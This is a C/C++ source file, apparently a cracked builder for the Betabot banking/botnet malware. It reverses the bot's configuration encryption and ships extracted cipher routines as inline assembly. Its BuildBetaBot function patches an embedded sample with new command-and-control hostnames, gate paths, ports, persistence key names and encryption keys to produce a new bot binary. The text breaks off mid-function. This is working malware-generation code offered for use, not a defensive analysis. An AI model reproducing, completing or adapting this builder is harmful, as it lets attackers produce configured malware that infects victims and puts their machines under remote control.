#include "betaBotBuilder.h"

#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>

#include "RandomEx.h"
#include "BetaBotSample.h"
#include "BetaBotSampleDump.h"
#include "Packer.h"

// Analysis by duyan13@HH
// Special Credits for this analysis : IDA and Olly, Fortinet, testacc@HH (Sample and mental support), Let it go (Idina Menzel)

#define BetaBot_Config_Length (DWORD)0xD56
#define STARTCONFIGENTRY 0x156
#define CONFIGENTRYLENGTH 0xc0

#pragma pack(push)
#pragma pack(1)

typedef struct
{
	USHORT cbSize;

	LONGLONG Magic;

	DWORD Value0;

	DWORD Value1;

	DWORD Value2;

} MagicContainer;

typedef struct
{
	WORD cbSize; // 0xC0
	DWORD Unknown0; // 0x869

	LONGLONG UnknownX; // Probably a ID to trace back user ? ( 0x2B11225B2BE27D81 )

	DWORD UnknownHash; // UnknownHash(Ptr_Hostname, HostnameLength)

	WORD ConnectAttemps; // <= 999
	WORD Port;

	DWORD HostNameHash1; // lstrlen(Hostname) ^ (ConfigEntryIndex + 0xA5F0)

	DWORD Unknown5; // 0x2B1EDC59

	BOOL UseSSL;

	DWORD Unknown6; // 0x39C9

	CHAR Hostname[0x40]; // NULLTERMINATEDSTRING
	CHAR Gate[0x40]; // NULLTERMINATEDSTRING

	DWORD HostNameHash2; // (This ^ 0x1A) - 1 == HostnameLength => (HostnameLength + 1) ^ 0x1A
	DWORD Unknown8; // 0x2B18B145

	BYTE Key1[9]; // 8bytes Key
	BYTE Key2[9]; // 8bytes Key
} ConfigEntry;

typedef struct
{
	USHORT cbSize; // 0xD56
	DWORD Signature; // 0xC1920FAA
	CHAR CustomID[32];
	USHORT Reserved; // NULL
	DWORD Unknown1; // 0xD2C0000
	DWORD Unknown2; // NULL
	DWORD Unknown3; // NULL
	DWORD Unknown4; // NULL
	DWORD Unknown5; // 0x1
	DWORD DelayErrorConfig; // 0x258
	DWORD Unknown6; // 0x106
	USHORT Unknown7; // NULL
	WCHAR StartupKeyName[64];
	WCHAR InstallFolderName[64];
	DWORD Unknown8; // 0x402B
	DWORD Unknown9; // 0x200
	DWORD HashOfConfigEntrys; // 0xFBA101B9 => BetaHash3(ConfigData(Encrypted), Length(0xC00))
	DWORD Unknown10; // 0x244
	ConfigEntry Configs[16];

} BetaConfig;

#pragma pack(pop)

typedef struct
{
	int x;
	int y;
	unsigned char m[256];
} arc4_context;

typedef struct
{
	BYTE* DataBuffer;

	MagicContainer* ConfigKeyHash;

	MagicContainer* ConfigDataHash1;

	MagicContainer* ConfigDataHash2;

	MagicContainer* ConfigDataHash3;

	MagicContainer* ConfigDataHash4;

	DWORD* ConfigDataHash5;

	BYTE* KeyData;

	BYTE* ConfigData;

} builderContext;

void arc4_setup(arc4_context *ctx, const unsigned char *key, unsigned int keylen)
{
	int i, j, a;
	unsigned int k;
	unsigned char *m;

	ctx->x = 0;
	ctx->y = 0;
	m = ctx->m;

	for( i = 0; i < 256; i++ )
		m[i] = (unsigned char) i;

	j = k = 0;

	for( i = 0; i < 256; i++, k++ )
	{
		if( k >= keylen ) k = 0;

		a = m[i];
		j = ( j + a + key[k] ) & 0xFF;
		m[i] = m[j];
		m[j] = (unsigned char) a;
	}
}

int arc4_crypt(arc4_context *ctx, size_t length, const unsigned char *input, unsigned char *output)
{
	int x, y, a, b;
	size_t i;
	unsigned char *m;

	x = ctx->x;
	y = ctx->y;
	m = ctx->m;

	for( i = 0; i < length; i++ )
	{
		x = ( x + 1 ) & 0xFF; a = m[x];
		y = ( y + a ) & 0xFF; b = m[y];

		m[x] = (unsigned char) b;
		m[y] = (unsigned char) a;

		output[i] = (unsigned char)
			( input[i] ^ m[(unsigned char)( a + b )] );
	}

	ctx->x = x;
	ctx->y = y;

	return 0;
}

void RC4Transform(BYTE* inputData, DWORD inputLength, BYTE* keyData, DWORD keyLength, BYTE* OutputData)
{
	arc4_context ctx;

	memset(&ctx, 0, sizeof(arc4_context));

	arc4_setup(&ctx, keyData, keyLength);

	arc4_crypt(&ctx, inputLength, inputData, OutputData);
}

void CustomEncrypt(BYTE* data, DWORD length, DWORD key)
{
	int v10 = 0;
	do
	{
		*(BYTE*)(v10 + data) ^= *((BYTE*)&key + (v10 & 3));

		++v10;
	}
	while (v10 < length);
}

int __stdcall UnknownHash(int a1, int a2)
{
	unsigned int v2; // ebx@1
	unsigned int v3; // ecx@1

	v2 = 0;
	v3 = 1;
	for (int i = 0; i < a2; v2 = (v2 + v3) % 0x100AE)
		v3 = (v3 + *(BYTE*)(i++ + a1)) % 0x100AE;

	return v3 | (v2 << 16);
}

int __stdcall UnknownHash2(int a1, int a2)
{
	unsigned int v3; // [sp+0h] [bp-Ch]@1
	unsigned int v5; // [sp+8h] [bp-4h]@1

	v5 = 1;
	v3 = 0;

	for (int i = 0; i < a2; ++i )
	{
		v5 = (v5 + *(BYTE*)(i + a1)) % 0x100B3;
		v3 = (v5 + v3) % 0x100B3;
	}

	return v5 | (v3 << 16);
}

int __stdcall HasherEGConfig(int a1, int a2)
{
	unsigned int v2; // ebx@1
	unsigned int v3; // ecx@1
	int i; // edi@1

	v2 = 0;
	v3 = 1;
	for ( i = 0; i < a2; v2 = (v2 + v3) % 0xFF0B )
		v3 = (v3 + *(BYTE*)(i++ + a1)) % 0xFF0B;

	return v3 | (v2 << 16);
}

CHAR* okay = NULL;

// This ! lol Couldn't reverse engineering this algo so I simply extracted it xD.

__declspec(naked) void BetaCipher()
{
	__asm
	{
LOC_FUNCTION_ENTRY_POINT:
		jmp LOC_0x000D49DB;
LOC_0x000C1493:
		push ebp;
		mov ebp, esp;
		push ecx;
		cmp dword ptr [ebp+0x0C], 0x00000000;
		je LOC_0x000C14A9;
		cmp dword ptr [ebp+0x08], 0x00000000;
		je LOC_0x000C14A9;
		cmp dword ptr [ebp+0x10], 0x00000000;
		jne LOC_0x000C14AD;
LOC_0x000C14A9:
		xor eax, eax;
		jmp LOC_0x000C14D7;
LOC_0x000C14AD:
		and dword ptr [ebp-0x04], 0x00000000;
		jmp LOC_0x000C14BA;
LOC_0x000C14B3:
		mov eax, dword ptr [ebp-0x04];
		inc eax;
		mov dword ptr [ebp-0x04], eax;
LOC_0x000C14BA:
		mov eax, dword ptr [ebp-0x04];
		cmp eax, dword ptr [ebp+0x10];
		jnc LOC_0x000C14D4;
		mov eax, dword ptr [ebp+0x08];
		add eax, dword ptr [ebp-0x04];
		mov ecx, dword ptr [ebp+0x0C];
		add ecx, dword ptr [ebp-0x04];
		mov cl, byte ptr [ecx];
		mov byte ptr [eax], cl;
		jmp LOC_0x000C14B3;
LOC_0x000C14D4:
		mov eax, dword ptr [ebp+0x08];
LOC_0x000C14D7:
		leave;
		retn 0x000C;
LOC_0x000C14DB:
		push ebp;
		mov ebp, esp;
		push ecx;
		cmp dword ptr [ebp+0x08], 0x00000000;
		je LOC_0x000C14EB;
		cmp dword ptr [ebp+0x10], 0x00000000;
		jne LOC_0x000C14EF;
LOC_0x000C14EB:
		xor eax, eax;
		jmp LOC_0x000C1514;
LOC_0x000C14EF:
		and dword ptr [ebp-0x04], 0x00000000;
		jmp LOC_0x000C14FC;
LOC_0x000C14F5:
		mov eax, dword ptr [ebp-0x04];
		inc eax;
		mov dword ptr [ebp-0x04], eax;
LOC_0x000C14FC:
		mov eax, dword ptr [ebp-0x04];
		cmp eax, dword ptr [ebp+0x10];
		jnc LOC_0x000C1511;
		mov eax, dword ptr [ebp+0x08];
		add eax, dword ptr [ebp-0x04];
		mov cl, byte ptr [ebp+0x0C];
		mov byte ptr [eax], cl;
		jmp LOC_0x000C14F5;
LOC_0x000C1511:
		mov eax, dword ptr [ebp+0x08];
LOC_0x000C1514:
		leave;
		retn 0x000C;
LOC_0x000D49DB:
		push ebp;
		mov ebp, esp;
		xor eax, eax;
		sub esp, 0x000000D4;
		cmp dword ptr [ebp+0x08], eax;
		je LOC_0x000D4A59;
		cmp ebx, 0x10;
		jnbe LOC_0x000D4A59;
		cmp okay, eax;
		jne LOC_0x000D49FD;
		push 0xFFFFFFFE;
		pop eax;
		jmp LOC_0x000D4A5C;
LOC_0x000D49FD:
		push 0x00000010;
		push eax;
		lea eax, dword ptr [ebp-0x14];
		push eax;
		call LOC_0x000C14DB;
		push 0x000000C0;
		push dword ptr [ebp+0x08];
		lea eax, dword ptr [ebp-0x000000D4];
		push eax;
		call LOC_0x000C1493;
		mov eax, okay;
		push 0x0000000F;
		push eax;
		lea eax, dword ptr [ebp-0x14];
		push eax;
		call lstrcpynA;
		push dword ptr [ebp+0x08];
		mov al, bl;
		mov cl, 0x03;
		imul cl;
		mov byte ptr [ebp-0x14], al;
		lea eax, dword ptr [ebp-0x000000D4];
		push eax;
		lea ecx, dword ptr [ebp-0x14];
		mov byte ptr [ebp-0x13], bl;
		call LOC_0x000D7755;
		mov eax, 0x000000C0;
		jmp LOC_0x000D4A5C;
LOC_0x000D4A59:
		or eax, 0xFFFFFFFF;
LOC_0x000D4A5C:
		leave;
		retn 0x0004;
LOC_0x000D745A:
		push ebp;
		mov ebp, esp;
		push ecx;
		mov ecx, dword ptr [eax+0x00001000];
		mov edx, 0x000001FF;
		push ebx;
		and ecx, edx;
		push esi;
		lea ebx, dword ptr [ecx-0x0C];
		and ebx, edx;
		push edi;
		mov dword ptr [ebp-0x04], ebx;
		lea esi, dword ptr [ecx-0x03];
		lea edi, dword ptr [ecx-0x0A];
		lea ebx, dword ptr [ecx+0x01];
		and esi, edx;
		and edi, edx;
		and ebx, edx;
		cmp dword ptr [eax+0x00001000], 0x00000200;
		jnc LOC_0x000D74CF;
		mov esi, dword ptr [eax+esi*4];
		mov edx, dword ptr [eax+ebx*4];
		rol edx, 0x09;
		ror esi, 0x0A;
		xor edx, esi;
		mov esi, dword ptr [eax+edi*4];
		lea ecx, dword ptr [eax+ecx*4];
		ror esi, 0x08;
		add edx, esi;
		add dword ptr [ecx], edx;
		mov esi, dword ptr [ecx];
		mov ecx, dword ptr [ebp-0x04];
		mov edx, dword ptr [eax+ecx*4];
		mov ecx, edx;
		shr ecx, 0x10;
		movzx ecx, cl;
		mov ecx, dword ptr [eax+ecx*4+0x00000C00];
		movzx edx, dl;
		add ecx, dword ptr [eax+edx*4+0x00000800];
		jmp LOC_0x000D751B;
LOC_0x000D74CF:
		mov esi, dword ptr [eax+esi*4+0x00000800];
		mov edx, dword ptr [eax+ebx*4+0x00000800];
		ror edx, 0x09;
		rol esi, 0x0A;
		xor edx, esi;
		mov esi, dword ptr [eax+edi*4+0x00000800];
		lea ecx, dword ptr [eax+ecx*4+0x00000800];
		rol esi, 0x08;
		add edx, esi;
		add dword ptr [ecx], edx;
		mov esi, dword ptr [ecx];
		mov ecx, dword ptr [ebp-0x04];
		mov edx, dword ptr [eax+ecx*4+0x00000800];
		mov ecx, edx;
		shr ecx, 0x10;
		movzx ecx, cl;
		mov ecx, dword ptr [eax+ecx*4+0x00000400];
		movzx edx, dl;
		add ecx, dword ptr [eax+edx*4];
LOC_0x000D751B:
		xor ecx, esi;
		mov dword ptr [eax+0x00001004], ecx;
		mov ecx, dword ptr [eax+0x00001000];
		pop edi;
		inc ecx;
		and ecx, 0x000003FF;
		pop esi;
		mov dword ptr [eax+0x00001000], ecx;
		pop ebx;
		leave;
		ret;
LOC_0x000D753B:
		push ebp;
		mov ebp, esp;
		push ecx;
		mov ecx, dword ptr [eax+0x00001000];
		mov edx, 0x000001FF;
		push ebx;
		and ecx, edx;
		push esi;
		lea ebx, dword ptr [ecx-0x0C];
		and ebx, edx;
		push edi;
		mov dword ptr [ebp-0x04], ebx;
		lea esi, dword ptr [ecx-0x03];
		lea edi, dword ptr [ecx-0x0A];
		lea ebx, dword ptr [ecx+0x01];
		and esi, edx;
		and edi, edx;
		and ebx, edx;
		cmp dword ptr [eax+0x00001000], 0x00000200;
		jnc LOC_0x000D75AE;
		mov edx, dword ptr [eax+ebx*4];
		mov esi, dword ptr [eax+esi*4];
		rol edx, 0x09;
		ror esi, 0x0A;
		xor edx, esi;
		mov esi, dword ptr [eax+edi*4];
		ror esi, 0x08;
		add edx, esi;
		lea ecx, dword ptr [eax+ecx*4];
		add dword ptr [ecx], edx;
		mov edx, dword ptr [ebp-0x04];
		mov edx, dword ptr [eax+edx*4];
		mov ebx, edx;
		shr ebx, 0x10;
		movzx edi, bl;
		mov edi, dword ptr [eax+edi*4+0x00000C00];
		movzx edx, dl;
		add edi, dword ptr [eax+edx*4+0x00000800];
		jmp LOC_0x000D75F8;
LOC_0x000D75AE:
		mov edx, dword ptr [eax+ebx*4+0x00000800];
		mov esi, dword ptr [eax+esi*4+0x00000800];
		ror edx, 0x09;
		rol esi, 0x0A;
		xor edx, esi;
		mov esi, dword ptr [eax+edi*4+0x00000800];
		rol esi, 0x08;
		add edx, esi;
		lea ecx, dword ptr [eax+ecx*4+0x00000800];
		add dword ptr [ecx], edx;
		mov edx, dword ptr [ebp-0x04];
		mov edx, dword ptr [eax+edx*4+0x00000800];
		mov ebx, edx;
		shr ebx, 0x10;
		movzx edi, bl;
		mov edi, dword ptr [eax+edi*4+0x00000400];
		movzx edx, dl;
		add edi, dword ptr [eax+edx*4];
LOC_0x000D75F8:
		xor edi, dword ptr [ecx];
		mov dword ptr [ecx], edi;
		mov ecx, dword ptr [eax+0x00001000];
		pop edi;
		inc ecx;
		and ecx, 0x000003FF;
		pop esi;
		mov dword ptr [eax+0x00001000], ecx;
		pop ebx;
		leave;
		ret;
LOC_0x000D7614:
		push ebp;
		mov ebp, esp;
		sub esp, 0x00001400;
		push esi;
		push edi;
		lea esi, dword ptr [ebp-0x00001400];
		lea edi, dword ptr [ebp-0x000013F0];
		push 0x00000004;
		sub esi, ecx;
		sub edi, ecx;
		pop eax;
LOC_0x000D7632:
		mov edx, dword ptr [ecx];
		mov dword ptr [esi+ecx], edx;
		mov dword ptr [edi+ecx], edx;
		add ecx, 0x04;
		dec eax;
		jne LOC_0x000D7632;
		mov ecx, dword ptr [ebp+0x0C];
		lea esi, dword ptr [ebp-0x000013E0];
		lea edi, dword ptr [ebp-0x000013D0];
		push 0x00000004;
		sub esi, ecx;
		sub edi, ecx;
		pop eax;
LOC_0x000D7656:
		mov edx, dword ptr [ecx];
		mov dword ptr [esi+ecx], edx;
		mov dword ptr [edi+ecx], edx;
		add ecx, 0x04;
		dec eax;
		jne LOC_0x000D7656;
		mov dword ptr [ebp+0x0C], 0x00000010;
		lea ecx, dword ptr [ebp-0x000013C8];
LOC_0x000D7671:
		mov edx, dword ptr [ecx-0x34];
		mov esi, dword ptr [ecx];
		mov eax, edx;
		rol eax, 0x0E;
		mov edi, edx;
		shr edx, 0x03;
		ror edi, 0x07;
		xor eax, edi;
		xor eax, edx;
		mov edx, esi;
		rol edx, 0x0F;
		mov edi, esi;
		rol edi, 0x0D;
		xor edx, edi;
		shr esi, 0x0A;
		xor edx, esi;
		add eax, edx;
		add eax, dword ptr [ecx-0x38];
		add ecx, 0x04;
		add eax, dword ptr [ecx-0x18];
		add eax, dword ptr [ebp+0x0C];
		inc dword ptr [ebp+0x0C];
		cmp dword ptr [ebp+0x0C], 0x00000500;
		mov dword ptr [ecx+0x04], eax;
		jc LOC_0x000D7671;
		mov eax, dword ptr [ebp+0x08];
		mov edx, 0x00000200;
		mov ecx, edx;
		lea esi, dword ptr [ebp-0x00001000];
		mov edi, eax;
		rep movsd;
		lea edi, dword ptr [eax+0x00000800];
		mov ecx, edx;
		lea esi, dword ptr [ebp-0x00000800];
		rep movsd;
		and dword ptr [eax+0x00001000], 0x00000000;
		mov esi, 0x00000400;
LOC_0x000D76E5:
		call LOC_0x000D753B;
		dec esi;
		jne LOC_0x000D76E5;
		pop edi;
		pop esi;
		leave;
		retn 0x0008;
LOC_0x000D76F3:
		push ebp;
		mov ebp, esp;
		sub esp, 0x0000101C;
		push ebx;
		push esi;
		push edi;
		push dword ptr [ebp+0x08];
		mov esi, eax;
		lea eax, dword ptr [ebp-0x00001018];
		push eax;
		call LOC_0x000D7614;
		mov edi, dword ptr [ebp+0x0C];
		xor ebx, ebx;
		mov dword ptr [ebp-0x04], ebx;
		sub edi, esi;
LOC_0x000D771A:
		lea eax, dword ptr [ebp-0x00001018];
		call LOC_0x000D745A;
		mov eax, dword ptr [edi+esi];
		xor eax, dword ptr [ebp-0x14];
		add ebx, 0x04;
		adc dword ptr [ebp-0x04], 0x00000000;
		mov ecx, dword ptr [ebp-0x04];
		mov dword ptr [esi], eax;
		add esi, 0x04;
		mov eax, ebx;
		add eax, 0x04;
		adc ecx, 0x00000000;
		mov dword ptr [ebp-0x0C], ecx;
		jne LOC_0x000D774E;
		cmp eax, 0x000000C0;
		jbe LOC_0x000D771A;
LOC_0x000D774E:
		pop edi;
		pop esi;
		pop ebx;
		leave;
		retn 0x0008;
LOC_0x000D7755:
		push ebp;
		mov ebp, esp;
		sub esp, 0x14;
		push edi;
		test ecx, ecx;
		je LOC_0x000D7789;
		cmp dword ptr [ebp+0x08], 0x00000000;
		je LOC_0x000D7789;
		cmp dword ptr [ebp+0x0C], 0x00000000;
		je LOC_0x000D7789;
		push dword ptr [ebp+0x08];
		xor eax, eax;
		lea edi, dword ptr [ebp-0x10];
		stosd;
		stosd;
		stosd;
		stosd;
		lea eax, dword ptr [ebp-0x10];
		push eax;
		mov eax, dword ptr [ebp+0x0C];
		call LOC_0x000D76F3;
		xor eax, eax;
		inc eax;
		jmp LOC_0x000D778B;
LOC_0x000D7789:
		xor eax, eax;
LOC_0x000D778B:
		pop edi;
		leave;
		retn 0x0008;
	}
}

__declspec(naked) void BetaAfterDedc()
{
	__asm
	{
LOC_FUNCTION_ENTRY_POINT:
		jmp LOC_0x0010E987;
LOC_0x001019D6:
		xor eax, eax;
		test ecx, ecx;
		je LOC_0x001019E7;
		cmp byte ptr [ecx], al;
		je LOC_0x001019E7;
LOC_0x001019E0:
		inc ecx;
		inc eax;
		cmp byte ptr [ecx], 0x00;
		jne LOC_0x001019E0;
LOC_0x001019E7:
		ret;
LOC_0x00106D10:
		push ebp;
		mov ebp, esp;
		sub esp, 0x10;
		cmp dword ptr [ebp+0x08], 0x00000000;
		jne LOC_0x00106D23;
		xor eax, eax;
		jmp LOC_0x00106E43;
LOC_0x00106D23:
		mov ecx, dword ptr [ebp+0x08];
		call LOC_0x001019D6;
		mov dword ptr [ebp-0x10], eax;
		mov eax, dword ptr [ebp+0x08];
		movsx eax, byte ptr [eax];
		mov ecx, dword ptr [ebp-0x10];
		lea eax, dword ptr [eax+ecx*2];
		mov ecx, dword ptr [ebp-0x10];
		dec ecx;
		dec ecx;
		xor edx, edx;
		div ecx;
		inc edx;
		mov dword ptr [ebp-0x04], edx;
		mov eax, dword ptr [ebp+0x08];
		movsx eax, byte ptr [eax];
		mov ecx, dword ptr [ebp-0x10];
		lea eax, dword ptr [eax+ecx*8+0x08];
		mov ecx, dword ptr [ebp-0x10];
		sub ecx, 0x03;
		xor edx, edx;
		div ecx;
		inc edx;
		inc edx;
		mov dword ptr [ebp-0x08], edx;
		mov byte ptr [ebp-0x09], 0x00;
		cmp dword ptr [ebp-0x10], 0x08;
		jc LOC_0x00106D73;
		cmp dword ptr [ebp-0x10], 0x40;
		jbe LOC_0x00106D7A;
LOC_0x00106D73:
		xor eax, eax;
		jmp LOC_0x00106E43;
LOC_0x00106D7A:
		mov eax, dword ptr [ebp-0x04];
		cmp eax, dword ptr [ebp-0x10];
		jne LOC_0x00106D8A;
		mov eax, dword ptr [ebp-0x04];
		dec eax;
		dec eax;
		mov dword ptr [ebp-0x04], eax;
LOC_0x00106D8A:
		mov eax, dword ptr [ebp-0x08];
		cmp eax, dword ptr [ebp-0x10];
		jne LOC_0x00106D9B;
		mov eax, dword ptr [ebp-0x08];
		sub eax, 0x03;
		mov dword ptr [ebp-0x08], eax;
LOC_0x00106D9B:
		mov eax, dword ptr [ebp-0x08];
		cmp eax, dword ptr [ebp-0x04];
		jne LOC_0x00106DAA;
		mov eax, dword ptr [ebp-0x08];
		dec eax;
		mov dword ptr [ebp-0x08], eax;
LOC_0x00106DAA:
		mov eax, dword ptr [ebp+0x08];
		add eax, dword ptr [ebp-0x04];
		mov al, byte ptr [eax];
		mov byte ptr [ebp-0x09], al;
		mov eax, dword ptr [ebp+0x08];
		movsx eax, byte ptr [eax];
		imul eax, eax, 0x0000028F;
		cdq;
		push 0x00000003;
		pop ecx;
		idiv ecx;
		add edx, 0x18;
		mov eax, dword ptr [ebp+0x08];
		add eax, dword ptr [ebp-0x04];
		movsx eax, byte ptr [eax];
		xor eax, edx;
		mov ecx, dword ptr [ebp+0x08];
		add ecx, dword ptr [ebp-0x04];
		mov byte ptr [ecx], al;
		mov eax, dword ptr [ebp+0x08];
		add eax, dword ptr [ebp-0x04];
		movsx eax, byte ptr [eax];
		test eax, eax;
		jne LOC_0x00106DF5;
		mov eax, dword ptr [ebp+0x08];
		add eax, dword ptr [ebp-0x04];
		mov cl, byte ptr [ebp-0x09];
		mov byte ptr [eax], cl;
LOC_0x00106DF5:
		mov eax, dword ptr [ebp+0x08];
		add eax, dword ptr [ebp-0x08];
		mov al, byte ptr [eax];
		mov byte ptr [ebp-0x09], al;
		mov eax, dword ptr [ebp+0x08];
		movsx eax, byte ptr [eax];
		imul eax, eax, 0x00000590;
		cdq;
		push 0x00000006;
		pop ecx;
		idiv ecx;
		add edx, 0x17;
		mov eax, dword ptr [ebp+0x08];
		add eax, dword ptr [ebp-0x08];
		movsx eax, byte ptr [eax];
		xor eax, edx;
		mov ecx, dword ptr [ebp+0x08];
		add ecx, dword ptr [ebp-0x08];
		mov byte ptr [ecx], al;
		mov eax, dword ptr [ebp+0x08];
		add eax, dword ptr [ebp-0x08];
		movsx eax, byte ptr [eax];
		test eax, eax;
		jne LOC_0x00106E40;
		mov eax, dword ptr [ebp+0x08];
		add eax, dword ptr [ebp-0x08];
		mov cl, byte ptr [ebp-0x09];
		mov byte ptr [eax], cl;
LOC_0x00106E40:
		mov eax, dword ptr [ebp-0x10];
LOC_0x00106E43:
		leave;
		retn 0x0004;
LOC_0x0010E978:
		push ebp;
		mov ebp, esp;
		push dword ptr [ebp+0x08];
		call LOC_0x00106D10;
		pop ebp;
		retn 0x0004;
LOC_0x0010E987:
		push ebp;
		mov ebp, esp;
		cmp dword ptr [ebp+0x08], 0x00000000;
		jne LOC_0x0010E992;
		jmp LOC_0x0010E99E;
LOC_0x0010E992:
		mov eax, dword ptr [ebp+0x08];
		add eax, 0x26;
		push eax;
		call LOC_0x0010E978;
LOC_0x0010E99E:
		pop ebp;
		retn 0x0004;
	}
}

void DecryptAfterAll(PVOID ok)
{
	__asm
	{
		push ok;

		call BetaAfterDedc;
	}
}

DWORD preStubDecrypt(int count, CHAR* id, ULONG_PTR data)
{
	okay = id;

	__asm
	{
		push ebx;

		mov ebx, count;

		push data;

		call BetaCipher;

		pop ebx;

	}
}

DWORD BetaHash(BYTE* a1, int a2)
{
	unsigned int v2; // ebx@1
	unsigned int v3; // esi@1
	int i; // edi@1

	v2 = 0;
	v3 = 1;
	for ( i = 0; i < a2; v2 = (v2 + v3) % 0xFFF1 )
		v3 = (v3 + *(BYTE*)(i++ + a1)) % 0xFFF1;

	return v3 | (v2 << 16);
}

void PrintBytes(PVOID data, int Length)
{
	for(int i = 0; i < Length; i += 4)
		printf("%02x%02x%02x%02x", ((BYTE*)data)[i], ((BYTE*)data)[i + 1], ((BYTE*)data)[i + 2], ((BYTE*)data)[i + 3]);

	printf("\r\n\r\n");
}

void DecryptData(MagicContainer* keyHash, BYTE* Key, BYTE* Data)
{
	int ss = sizeof(ConfigEntry);

	DWORD hash = BetaHash(Key, 32);

	BYTE keyDec[16];

	CHAR DecryptedData[BetaBot_Config_Length];

	memset(keyDec, 0, sizeof(keyDec));

	memset(DecryptedData, 0, sizeof(DecryptedData));

	DWORD Hash1 = HasherEGConfig((int)Data, sizeof(BetaConfig)) ^ 0x9D01;

	DWORD Hash2 = HasherEGConfig((int)Data, sizeof(BetaConfig)) ^ 0x3AB5;

	DWORD Hash3 = HasherEGConfig((int)Data, sizeof(BetaConfig)) ^ 0xCC2B;

	DWORD Hash4 = HasherEGConfig((int)Data, sizeof(BetaConfig)) ^ 0x91C1;


	if(hash == keyHash->Value2 && hash ^ 0xFE81 == keyHash->Value1)
	{
		int y = 0;

		for (int i = 0; i < 32; i += 2)
			*((BYTE*)(keyDec + y++)) = (i + 0x1A) ^ *(BYTE*)(Key + i);
	}

	int oiju = UnknownHash2((int)Data, BetaBot_Config_Length);

	RC4Transform(Data, BetaBot_Config_Length, keyDec, 16, (BYTE*)DecryptedData);

	CustomEncrypt((BYTE*)DecryptedData, BetaBot_Config_Length, *(DWORD*)keyDec);

	PrintBytes(DecryptedData, BetaBot_Config_Length);

	BYTE myStuff[CONFIGENTRYLENGTH * 16];

	memcpy(myStuff, DecryptedData + STARTCONFIGENTRY, sizeof(myStuff));

	int hashCheck = UnknownHash((int)myStuff, sizeof(myStuff));

	for(int i = 0; i < 16; i++)
	{
		preStubDecrypt(i, DecryptedData + 6, (ULONG_PTR)(myStuff + i * CONFIGENTRYLENGTH));

		DecryptAfterAll(myStuff + i * CONFIGENTRYLENGTH);

		PrintBytes(myStuff + i * CONFIGENTRYLENGTH, CONFIGENTRYLENGTH);

		int okidoy = UnknownHash((int)((myStuff + i * CONFIGENTRYLENGTH) + 0x26), strlen((char*)(myStuff + i * CONFIGENTRYLENGTH) + 0x26));
	}

}

char* RandomString(char* Buffer, size_t Length)
{
	static const char RandomStringChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789123456789";

	DWORD rndI;

	if(Buffer == nullptr)
		return 0;

	for(size_t i = 0; i < Length; i++)
	{
		GetRandomBytes((BYTE*)&rndI, sizeof(DWORD));

		Buffer[i] = RandomStringChars[rndI % (sizeof(RandomStringChars) - 1)];
	}

	return Buffer;
}

builderContext* getBetaBotContext(BYTE* DumpData, DWORD LengthDumpData)
{
	builderContext* ctx;

	BYTE* newBuffer;

	ctx = (builderContext*)calloc(1, sizeof(builderContext));

	newBuffer = (BYTE*)malloc(LengthDumpData);

	if(ctx != NULL && newBuffer != NULL && DumpData != NULL && LengthDumpData > 0)
	{
		memcpy(newBuffer, DumpData, LengthDumpData);

		ctx->DataBuffer = newBuffer;

		ctx->ConfigKeyHash = (MagicContainer*)(newBuffer + 0x37364); // Offsets extracted by IDA
		ctx->ConfigDataHash1 = (MagicContainer*)(newBuffer + 0x37494);
		ctx->ConfigDataHash2 = (MagicContainer*)(newBuffer + 0x373B0);
		ctx->ConfigDataHash3 = (MagicContainer*)(newBuffer + 0x3740C);
		ctx->ConfigDataHash4 = (MagicContainer*)(newBuffer + 0x373C8);
		ctx->ConfigDataHash5 = (DWORD*)(newBuffer + 0x2F0C8);

		ctx->KeyData = (BYTE*)(newBuffer + 0x3738E);
		ctx->ConfigData = (BYTE*)(newBuffer + 0x2F38C);

		memset(ctx->KeyData, 0, 32);
		memset(ctx->ConfigData, 0, sizeof(BetaConfig));
	}
	else
	{
		if(ctx != NULL)
			free(ctx);

		if(newBuffer != NULL)
			free(newBuffer);
	}

	return ctx;
}

void freeBetaBotContext(builderContext* ctx)
{
	if(ctx != NULL)
	{
		free(ctx->DataBuffer);

		free(ctx);
	}
}

BOOL BuildBetaBot(CHAR* outputFilename, WCHAR* newStartupName, WCHAR* newFoldername, DWORD numOfEntries, TempConfigEntry* confEntries, BYTE* outKey1, BYTE* outKey2)
{
	builderContext* ctx;

	BYTE encryptionKey[16];

	BYTE configKey[32];

	BYTE webKEY1[8];

	BYTE webKEY2[8];

	CHAR newCustomID[25];

	BetaConfig betaConfig;

	BetaConfig configDataEncrypted;

	ctx = getBetaBotContext(bb_OriginalDump, sizeof(bb_OriginalDump));

	if(ctx == NULL)
		return FALSE;

	if(numOfEntries > 16 || numOfEntries == 0 || confEntries == NULL || newStartupName == NULL || newFoldername == NULL || outKey1 == NULL || outKey2 == NULL)
	{
		freeBetaBotContext(ctx);

		return FALSE;
	}

#pragma region Memset & RandomKeys

	memset(&configDataEncrypted, 0, sizeof(BetaConfig));
	memset(&betaConfig, 0, sizeof(BetaConfig));
	memset(newCustomID, 0, sizeof(newCustomID));

	RandomString(newCustomID, sizeof(newCustomID) - 1);

	GetRandomBytes(encryptionKey, 16);
	GetRandomBytes(configKey, 32);
	GetRandomBytes(webKEY1, 8);
	GetRandomBytes(webKEY2, 8);

#pragma endregion

#pragma region KeyHash

	for (int i = 0, y = 0; i < 32; i += 2, y++)
		configKey[i] = (i + 0x1A) ^ encryptionKey[y];

	ctx->ConfigKeyHash->cbSize = sizeof(MagicContainer);

	ctx->ConfigKeyHash->Magic = 0xCC8A7D65B82CFFE1;

	ctx->ConfigKeyHash->Value0 = NULL;

	ctx->ConfigKeyHash->Value2 = BetaHash(configKey, 32);

	ctx->ConfigKeyHash->Value1 = ctx->ConfigKeyHash->Value2 ^ 0xFE81;

#pragma endregion

#pragma region Settings

	betaConfig.cbSize = sizeof(BetaConfig);
	betaConfig.Signature = 0xC1920FAA;

	strcpy(betaConfig.CustomID, newCustomID);

	betaConfig.Reserved = NULL;
	betaConfig.Unknown1 = 0xD2C0000;
	betaConfig.Unknown2 = NULL;
	betaConfig.Unknown3 = NULL;
	betaConfig.Unknown4 = NULL;
	betaConfig.Unknown5 = 0x1;
	betaConfig.Unknown6 = 0x106;
	betaConfig.Unknown7 = NULL;

	betaConfig.Unknown8 = 0x402B;
	betaConfig.Unknown9 = 0x200;
	betaConfig.Unknown10 = 0x244;

	betaConfig.DelayErrorConfig = 600;

	wcscpy(betaConfig.InstallFolderName, newFoldername);
	wcscpy(betaConfig.StartupKeyName, newStartupName);

	for(int i = 0; i < numOfEntries; i++)
	{
